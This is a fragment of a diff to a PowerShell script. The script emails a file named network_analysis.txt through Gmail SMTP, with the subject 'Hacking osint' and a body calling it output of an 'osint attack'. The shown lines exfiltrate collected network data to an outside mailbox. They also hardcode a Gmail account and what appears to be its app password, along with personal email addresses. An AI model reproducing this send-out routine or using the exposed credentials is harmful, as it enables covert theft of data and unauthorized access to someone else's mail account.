@@ -10,7 +10,7 @@ $smtpPort = 587  # Usually 587 for TLS or 465 for SSL
 $smtpUser = "noreplypassguardx@gmail.com"  # Your email address
 $smtpPass = "xptq cjsd ecwi zodr"  # Your email password
 $from = "hacking@gmail.com"  # Your email address
-$to = "nategreat318@gmail.com"  # Recipient's email address
+$to = ""  # Recipient's email address
 $subject = "Hacking osint"
 $body = "Attached is the network_analysis.txt file generated after the osint attack cleanup."
 
@@ -29,3 +29,4 @@ $smtpClient.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $sm
 
 # Send the email
 $smtpClient.Send($mailMessage)
+
